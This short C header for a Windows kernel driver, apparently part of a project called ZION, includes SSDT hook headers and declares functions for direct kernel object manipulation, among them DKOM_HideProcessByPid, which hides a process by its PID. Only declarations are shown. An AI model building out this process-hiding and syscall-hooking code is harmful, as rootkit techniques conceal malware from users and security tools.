/*
 *      name: ZION system DKOM Eprocess kernel
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#pragma once

#include <ntddk.h>
#include <windef.h>
#include <memory.h>
#include "../zion_proxy_dll/zion_ssdt_hook.h"
#include "zion_ssdt_hook_impl.h"

#include "zion/server/zion_common.h"
#include "zion/zion_cmd_packet.h"
#include "../include/zion/zion_dkom_def.h" 
//extern PLIST_ENTRY PsActiveProcessHead;
#define ZION_EPROCESS_ACTIVE_LINK 0x00000001
#define ZION_EPROCESS_PID         0x00000002
BOOL GetPsActiveProcessHeadAddr(PLIST_ENTRY *Head);
DWORD GetEPROCESSOffset(DWORD signature);
BOOL DKOM_HideProcessByPid(PEPROCESS ptrSystem, DWORD pid);